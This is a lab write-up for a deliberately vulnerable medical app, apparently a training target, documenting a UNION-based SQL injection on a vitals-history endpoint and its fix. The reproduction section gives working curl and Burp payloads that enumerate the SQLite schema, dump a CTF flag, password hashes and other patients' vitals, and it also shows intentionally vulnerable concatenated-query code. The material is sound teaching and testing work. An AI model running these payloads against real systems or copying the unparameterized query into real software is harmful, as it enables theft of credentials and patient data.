---
id: M4
title: "Insufficient Input/Output Validation"
category: Mobile
status: DONE
severity: Critical
owasp: "Mobile M4 — Insufficient Input/Output Validation"
cwe: "CWE-89 (SQL Injection) / CWE-209 (Generation of Error Message Containing Sensitive Information)"
source_docs:
  - "CareOtter_Test_Suite.md §M4 (UNION-based SQLi on the reading-history endpoint)"
  - "Vulns/API/API1_Broken_Object_Level_Authorization.md (the API-side injection-vs-authz boundary)"
affected_components:
  - "cloud_api/careotter/api_server/services/database_service.py — search_readings_by_patient (raw string concatenation, no parameterization)"
  - "cloud_api/careotter/api_server/app.py — GET /api/vitals/readings (no try/except, verbose error via the global handler) + the patient-login response that now returns the numeric id"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/HistoricalReadingsActivity.java — sends the patient id as patient_id"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/LoginActivity.java — stores the numeric user_id from login"
verified_date: "2026-06-16"
---

# M4 — Insufficient Input/Output Validation

> **Status:** DONE
> **OWASP:** Mobile M4 — Insufficient Input/Output Validation
> **CWE:** CWE-89 / CWE-209
> **Severity:** Critical

---

## Why It Matters

A patient opens the app's new "Historical Readings" screen to review the last hour of their vitals. The screen sends the patient's own numeric id to the cloud as `GET /api/vitals/readings?patient_id=<id>`, and the backend builds the SQL query by pasting that id straight into the statement. The app validates nothing on the way out and the server validates nothing on the way in — exactly the input/output handling failure M4 describes. The result is a textbook UNION-based SQL injection: any authenticated patient can turn "show me my readings" into "read the entire database."

In a medical product the blast radius is severe. A single injected request walks the `users` table (every account's unsalted SHA-256 password hash), every other patient's vitals across the `vitals_readings` table, and a hidden device pre-shared key stored in `devices.ble_psk`. That PSK is seeded as the lab's capture-the-flag target, `FLAG{SQLi_M4_CareOtter_2026}`, and it is reachable through no other interface — the device-listing endpoints deliberately strip the column, so the injection is the only path to it. The verbose `sqlite3.OperationalError` the server returns turns the endpoint into a self-documenting oracle that guides the attacker from a single quote to a full dump.

---

## OWASP Classification

| Category                                      | Role                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **M4 — Insufficient Input/Output Validation** | Primary — the app emits an unvalidated `patient_id` and the server consumes it without validation or parameterization, producing SQL injection (CWE-89). The unsanitized error returned to the client is the output-side failure (CWE-209)                                                                                                                                                                                                  |
| **CWE-89 (SQL Injection)**                    | The concrete weakness — `patient_id` is concatenated into the query string with no `?` placeholder and no escaping                                                                                                                                                                                                                                                                                                                          |
| **CWE-209 (Verbose error)**                   | The injection oracle — under `VULNERABLE=1` the global handler echoes the raw `sqlite3.OperationalError` text, so a malformed payload reveals the syntax error that pinpoints the injection                                                                                                                                                                                                                                                 |
| **API-side injection**                        | Honest note — the injection *executes* server-side, so it also overlaps the API/Web injection family. This page keeps the M4 lens (the defect originates at the mobile request boundary and the app does no validation). The authorization boundary it is NOT — contrast [[API1_Broken_Object_Level_Authorization]], where a *valid* id reaches the right query but the wrong owner. Here the id is *malformed* and breaks the query itself |

> **Why this is M4 and not "just an API bug."** M4 is specifically about an app trusting data crossing a boundary without validating it. The CareOtter app builds the request from a value it controls (`user_id` from login), sends it with no validation, and renders whatever comes back. A defensive client would treat `patient_id` as an opaque server-owned identifier and never let it carry payload — but more importantly the server must parameterize. Both ends fail, which is what makes the lab realistic.

---

## Root Cause

The endpoint's backing query concatenates the parameter directly:

```python
# database_service.py — search_readings_by_patient (THE vulnerability)
since = (datetime.now() - timedelta(hours=1)).timestamp()   # panel scoped to the last hour
sql = ("SELECT v.bpm, v.spo2, v.timestamp "
       "FROM vitals_readings v "
       "JOIN devices d ON v.device_mac = d.mac "
       "JOIN users u ON d.patient_username = u.username "
       "WHERE v.timestamp >= " + str(since) + " AND u.id = " + str(patient_id) + " "  # <-- patient_id still the injectable tail
       "ORDER BY v.timestamp DESC LIMIT 500")
with sqlite3.connect(self.db_path) as conn:
    conn.row_factory = sqlite3.Row
    rows = conn.execute(sql).fetchall()                 # no try/except -> error propagates
    return [dict(r) for r in rows]
```

The last-hour `v.timestamp >= <cutoff>` filter is a fixed server-side literal placed *before* the injectable term, so `patient_id` remains the final token ahead of `ORDER BY`. It does not blunt the injection: a `UNION SELECT` is a separate query that the time window never constrains, so an injected payload whose base SELECT matches nothing (for example one ending the `WHERE` in `AND 1=0`) still returns the flag through the independent UNION'd SELECT.

Three design choices make this exploitable end-to-end:

1. **No parameterization.** The value is pasted in with `+ str(patient_id) +`. The safe sibling in the same file, `get_vitals_history`, binds every value with `?` placeholders — that one is left untouched as the contrast case. SQL injection is CWE-89.
2. **Numeric (unquoted) context.** The id sits as `WHERE u.id = <input>` with no surrounding quotes, so a stray quote breaks the syntax and a UNION needs no quote-breakout. This matches the lab's discovery flow: a value ending in `'` errors and one ending in `UNION SELECT ...` works directly. (Every value is prefixed with the caller's own id to pass the ownership gate described below.)
3. **Verbose errors, by omission.** The method has no `try/except`, so any `sqlite3.OperationalError` propagates through the route to the global handler in `app.py`, which under `VULNERABLE=1` returns `{"error": str(e), "type": "OperationalError"}` with HTTP 500. That is the CWE-209 oracle.

The route adds an ownership gate, but it is the wrong kind of validation:

```python
# app.py — GET /api/vitals/readings
patient_id = request.args.get('patient_id', '')

# BOLA fix (CWE-639): the requested id must be the caller's own. The id is
# resolved from the bearer token, so a bare cross-user id (patient_id=6 from
# another patient's token) is rejected 403. BUT it validates only the LEADING
# INTEGER and still passes the raw string to the query, so the injection sink
# below is untouched.
lead = re.match(r'\s*(\d+)', patient_id)
if not lead or int(lead.group(1)) != account['id']:
    return jsonify({'error': 'Forbidden — you may only read your own readings'}), 403

readings = db.search_readings_by_patient(patient_id)   # raw string still flows in
```

This is the realistic split that keeps the lab interesting: the authorization check parses `patient_id` as an integer (`int(lead.group(1))`), but the injection sink consumes it as a raw string. A payload that begins with the caller's own id — `2 AND 1=0 UNION SELECT ...` — has a leading integer of `2`, so it passes the ownership gate and reaches the unparameterized query intact. The bare cross-user IDOR (the API1 BOLA, [[API1_Broken_Object_Level_Authorization]]) is closed, the SQL injection (this page, CWE-89) is not. Cross-patient vitals are therefore still readable, but only by injecting (`... UNION SELECT ... FROM vitals_readings ... WHERE u.id=6--`), never by a plain `patient_id=6`.

### The flag and why the SQLi is the only way to it

A single secret row is seeded in `devices` with the flag in a `ble_psk` column:

```sql
INSERT OR IGNORE INTO devices (mac, patient_username, device_name, ble_psk)
VALUES ('FF:FF:FF:FF:FF:FF', '__ctf__', 'CareOtter_Provisioning', 'FLAG{SQLi_M4_CareOtter_2026}');
```

It is seeded in `_migrate_db()`, which runs on every startup, so the flag is present after both `cloudctl.sh stop/start` (volume kept) and `reset` (volume dropped, re-seeded). Every device-serializing method in `database_service.py` runs the row through `_public_device`, which pops `ble_psk` before it reaches any JSON response, so `/api/devices`, `/api/devices/me`, and the rest never expose it. Reading the flag requires reading the column directly, which only the injection can do.

### SQLite specifics (the payloads are not MySQL/Postgres)

The backend is SQLite. Schema enumeration uses `sqlite_master`, not `information_schema` (SQLite has no `information_schema`), and the table-name column is `name`, not `table_name`. The payloads below are written for SQLite and are tested against the running lab.

---

## Steps to Reproduce

Set `API` to the cloud base URL. Against the local stack that is the proxy on port 5002:

```bash
API=http://localhost:5002
```

### Step 1 — Authenticate as a patient

The endpoint is token-gated, so first obtain a patient JWT. The seeded patient is `john_doe` / `johnny123`. The login response now also returns the numeric `id` (the value the app stores and sends as `patient_id`).

```bash
LOGIN=$(curl -s "$API/api/auth/login/patient" \
  -H 'Content-Type: application/json' \
  -d '{"username":"john_doe","password":"johnny123"}')
JWT=$(printf '%s' "$LOGIN" | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
PID=$(printf '%s' "$LOGIN" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
echo "patient id = $PID"
```

### Step 2 — Baseline (legitimate request)

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
```

Returns `{"patient_id": "...", "count": N, "readings": [{"bpm":..,"spo2":..,"timestamp":..}, ...]}`. The legitimate result is scoped to the last hour (the `v.timestamp >= now-3600` filter), so `count` is the number of readings in the past 60 minutes.

> **Ownership gate — prefix every payload with your own id.** The endpoint now rejects any `patient_id` whose leading integer is not the caller's own id (`$PID`), so the old `patient_id=0`/`patient_id=1'` payloads return `403`, not the SQL error. Every injection below therefore starts with `$PID` and neutralizes the base row-set with `AND 1=0` so only the UNION rows return. A bare cross-user id (`patient_id=6`) is now a `403` (the API1 BOLA is closed), but the injection still reaches the query because the gate validates only the leading integer.

### Step 3 — Confirm the injection point (the error oracle)

A stray single quote after your own id breaks the unquoted numeric context:

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID'" \
  -H "Authorization: Bearer $JWT"
# -> HTTP 500  {"error":"unrecognized token: \"' ORDER BY v.timestamp DESC LIMIT 500\"", "type":"OperationalError"}
```

The `OperationalError` body confirms unsanitized input reaches the SQL engine.

### Step 4 — Determine the column count

```bash
# 3 columns -> succeeds (no error)
curl -s -G "$API/api/vitals/readings" --data-urlencode "patient_id=$PID ORDER BY 3--" -H "Authorization: Bearer $JWT"
# 4 columns -> errors ("1st ORDER BY term out of range - should be between 1 and 3")
curl -s -G "$API/api/vitals/readings" --data-urlencode "patient_id=$PID ORDER BY 4--" -H "Authorization: Bearer $JWT"
```

Three columns. UNION payloads therefore use three positions, `null,<value>,null`. The injected value surfaces under the **`spo2`** field (column 2 of `bpm, spo2, timestamp`).

### Step 5 — Enumerate the schema (SQLite `sqlite_master`)

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID AND 1=0 UNION SELECT null,name,null FROM sqlite_master WHERE type='table'--" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
```

![[m4_tables_enumeration.png]]

Each table name appears in a reading's `spo2` field: `users`, `devices`, `vitals_readings`, `alerts`, and so on. (`AND 1=0` makes the own-readings base empty, so only the injected rows return.)

### Step 6 — Reveal the flag column

The flag lives in a non-obvious column. Dump the `devices` DDL to find it:

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID AND 1=0 UNION SELECT null,sql,null FROM sqlite_master WHERE name='devices'--" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
# -> spo2 = "CREATE TABLE devices ( ... auth_hash TEXT, ... ble_psk TEXT, ... )"
```

![[m4_find_column_flag.png]]

The DDL exposes the `ble_psk` column.

### Step 7 — Dump the flag

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID AND 1=0 UNION SELECT null,ble_psk,null FROM devices WHERE ble_psk IS NOT NULL--" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
# -> readings[0].spo2 = "FLAG{...}"
```

### Step 8 — Dump credentials (the scenario's "dump of credentials")

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID AND 1=0 UNION SELECT null,username||':'||password_hash,null FROM users--" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
# -> spo2 = "admin:<sha256>", "john_doe:<sha256>", ...

hashid 45e35...
Analyzing '45e35...'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256)
```

### Step 9 — Cross-patient read (the SQLi reaches what the BOLA gate blocks)

A bare `patient_id=6` is now `403`, but the injection can still read another patient's vitals because the UNION'd query is independent of the ownership check:

```bash
curl -s -G "$API/api/vitals/readings" \
  --data-urlencode "patient_id=$PID AND 1=0 UNION SELECT v.bpm,v.spo2,v.timestamp FROM vitals_readings v JOIN devices d ON v.device_mac=d.mac JOIN users u ON d.patient_username=u.username WHERE u.id=6--" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
# -> every reading belongs to user id 6, with no time-window limit
```

![[m4_cross_patient_read.png]]

### Burp Suite

Capture the app's `GET /api/vitals/readings?patient_id=<id>` request (or any token-bearing request) and send it to Repeater. Replace the `patient_id` value with a URL-encoded payload that begins with your own id (here `2`) so it passes the ownership gate. For example, the flag dump:

```
GET /api/vitals/readings?patient_id=2%20AND%201%3D0%20UNION%20SELECT%20null,ble_psk,null%20FROM%20devices%20WHERE%20ble_psk%20IS%20NOT%20NULL-- HTTP/1.1
Host: localhost:5002
Authorization: Bearer <JWT>
```

![[m4_burp_capture_reading.png]]

![[m4_sqlite_hint.png]]

![[m4_spo2_flag.png]]

Burp's "URL-encode key characters" on the selected payload handles the spaces and `--` automatically. The flag returns in the `spo2` field of the JSON response.

---

## Expected Result

- Ownership gate: a bare cross-user id (`patient_id=6` from another patient's token) returns HTTP 403, and `patient_id=$PID` (own id) returns the last hour of the caller's readings. The old `patient_id=0`/`patient_id=1'` forms now return 403, not the SQL error.
- `patient_id=$PID'` returns HTTP 500 with a verbose `OperationalError` body (CWE-209).
- `$PID ORDER BY 3--` succeeds, `$PID ORDER BY 4--` errors — three columns confirmed.
- A `$PID AND 1=0 UNION ... sqlite_master` payload lists the database's tables in the `spo2` field.
- The `devices` DDL UNION reveals the `ble_psk` column, and the final UNION returns `FLAG{SQLi_M4_CareOtter_2026}`.
- A `users` UNION returns every `username:password_hash` pair, and a `vitals_readings ... WHERE u.id=6` UNION returns another patient's vitals (cross-patient read via the SQLi, not the bare parameter).
- Negative control: `GET /api/devices` (admin) and `GET /api/devices/me` (owner) responses contain no `ble_psk` field — the flag is reachable only through the injection.

---

## How It Should Be

```python
# Parameterized — the value is bound, never concatenated into the SQL text.
sql = ("SELECT v.bpm, v.spo2, v.timestamp "
       "FROM vitals_readings v "
       "JOIN devices d ON v.device_mac = d.mac "
       "JOIN users u ON d.patient_username = u.username "
       "WHERE u.id = ? "
       "ORDER BY v.timestamp DESC LIMIT 500")
rows = conn.execute(sql, (int(patient_id),)).fetchall()   # bound + coerced to int
```

- **Parameterize every query.** Bind values with `?` placeholders (or an ORM) so input can never alter the SQL structure. This alone closes CWE-89.
- **Validate and coerce at the boundary.** `patient_id` is a positive integer — reject anything else with a 400 before it reaches the database.
- **Authorize on the whole value, not the leading integer.** The endpoint already resolves the caller's id from the token and rejects a bare cross-user id (the API1 BOLA is closed). But it checks only the leading integer of `patient_id` and then passes the raw string on, so an injection prefixed with the caller's own id slips through. The correct check coerces the entire value with `int(patient_id)` (which rejects `2 AND 1=0 UNION ...` outright) or derives the patient solely from the token and ignores the client id — either one, combined with parameterization, removes both the IDOR and the injection.
- **Return generic errors.** Catch database exceptions and return a generic 500 with the detail logged server-side only, removing the CWE-209 oracle. Disable Flask debug in production.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Data access | Parameterized queries / ORM binding for every user-influenced value | Eliminate SQL injection (CWE-89) |
| Input validation | Coerce `patient_id` to a positive integer, 400 on failure | Reject payloads at the boundary |
| Authorization | Resolve the patient from the JWT, ignore client-supplied ids | Remove both the injection vector and the IDOR |
| Error handling | Generic 500 to the client, detail to server logs only, debug off | Close the verbose-error oracle (CWE-209) |
| App side | Treat server identifiers as opaque, validate/escape rendered output | Mobile-side input/output discipline (M4) |

---

## Verification Checklist

- [ ] **Ownership gate (BOLA closed)**: a bare `patient_id=<another patient's id>` returns HTTP 403, and `patient_id=$PID` (own id) returns the caller's readings.
- [ ] **Injection point**: `patient_id=$PID'` returns HTTP 500 with `"type":"OperationalError"` and a verbose message.
- [ ] **Column count**: `patient_id=$PID ORDER BY 3--` succeeds and `ORDER BY 4--` errors.
- [ ] **Schema read**: a `$PID AND 1=0 UNION ... sqlite_master` payload returns table names in the `spo2` field.
- [ ] **Flag column**: the `devices` DDL UNION shows `ble_psk`.
- [ ] **Flag dump**: the `ble_psk` UNION returns `FLAG{SQLi_M4_CareOtter_2026}`.
- [ ] **Credential dump**: the `users` UNION returns `username:password_hash` pairs.
- [ ] **Cross-patient via SQLi only**: `$PID AND 1=0 UNION ... WHERE u.id=<other>` returns another patient's vitals, while a bare `patient_id=<other>` is 403.
- [ ] **No side-channel leak**: `/api/devices` and `/api/devices/me` responses contain no `ble_psk` field.
- [ ] **Persistence**: the flag is still dumpable after `cloudctl.sh stop && start` and after `cloudctl.sh reset`.
- [ ] **App**: a patient login stores `user_id`, the dashboard "Historical Readings" card opens the screen, and the screen lists readings from `/api/vitals/readings?patient_id=<own id>`. `./gradlew assembleDebug` builds clean.

---

## Glossary

| Term | Definition |
|---|---|
| **UNION-based SQL injection** | An injection technique that appends a `UNION SELECT` to the original query so attacker-chosen rows are returned alongside (or instead of) the intended ones. Requires the injected `SELECT` to match the original column count — here three (`bpm, spo2, timestamp`). |
| **`sqlite_master`** | SQLite's built-in schema table (`SELECT name, sql FROM sqlite_master WHERE type='table'`). It replaces the MySQL/Postgres `information_schema.tables` used in generic SQLi guides — SQLite has no `information_schema`. |
| **`ble_psk`** | The hidden device pre-shared-key column added to the `devices` table to carry the CTF flag. Stripped from every API response by `_public_device`, so it is reachable only through this injection. |
| **Verbose error oracle** | The `sqlite3.OperationalError` text echoed to the client under `VULNERABLE=1` (CWE-209). It tells the attacker exactly why a payload failed, turning blind trial-and-error into a guided walk to the dump. |

---

## References

- `cloud_api/careotter/api_server/services/database_service.py` — `search_readings_by_patient` (the vulnerable concatenated query), `get_vitals_history` (the safe parameterized contrast), `_public_device` (strips `ble_psk`), `_migrate_db` (seeds the flag row idempotently).
- `cloud_api/careotter/api_server/app.py` — `GET /api/vitals/readings` (no try/except), `handle_exception` (the verbose-error global handler), `login_patient` (now returns the numeric `id`).
- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/HistoricalReadingsActivity.java` — sends `patient_id` and renders the readings.
- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/LoginActivity.java` — stores the numeric `user_id` from the login response.
- [[API1_Broken_Object_Level_Authorization]] — the neighbouring API-side weakness, contrasted above: valid-id-wrong-owner (authz) versus malformed-id-breaks-query (injection).
